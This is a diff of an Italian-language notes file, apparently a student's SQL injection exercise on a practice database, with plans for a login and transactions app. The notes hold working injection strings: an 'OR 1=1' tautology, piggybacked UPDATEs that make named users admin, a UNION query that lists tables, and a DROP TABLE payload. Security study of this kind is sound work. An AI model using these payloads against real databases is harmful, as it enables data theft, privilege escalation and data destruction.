@@ -63,21 +63,20 @@ RISOLVI ERRORI:
 
 COSA HO FATTO
 
-	Confidentiality : con tautologia 'OR 1=1 --'
+	Confidentiality : con tautologia 'OR 1=1 -- 
 		rubare dati
 
 	Integrity : con piggyback '; UPDATE utenti SET ruolo='admin' WHERE nome='emanuele' -- '
+								'; UPDATE utenti SET ruolo='admin' WHERE nome='alessio' -- 
 		modificare dati
 
 	Availability : 
 	//mi permette di ottenere il nome della tabella 
-	' UNION SELECT 1,table_name, 'x' FROM information_schema.tables WHERE table_schema='test' -- 
+	' UNION SELECT 1,table_name, 'y', 'x' FROM information_schema.tables WHERE table_schema='test' -- 
 
 	//droppare la tabella
-	DROP TABLE utenti
+	'; DROP TABLE utenti; -- 
 		cancellare dati
-
-
 
 
 
@@ -91,3 +90,16 @@ COSA HO FATTO
 #utenti
 	#acquisti --> transazioni (carte di credito)
 		#case --> ...
+
+
+
+login --> tabella utente/utenti --> accedi transazioni (l'admin accede alle transazioni generali)
+
+	*login --> se utente admin bottone per visualizzare la tab utenti 
+
+mi serve un sistema di errore login
+
+vorrei poter tornare indietro da 
+
+		transazioni
+		utenti
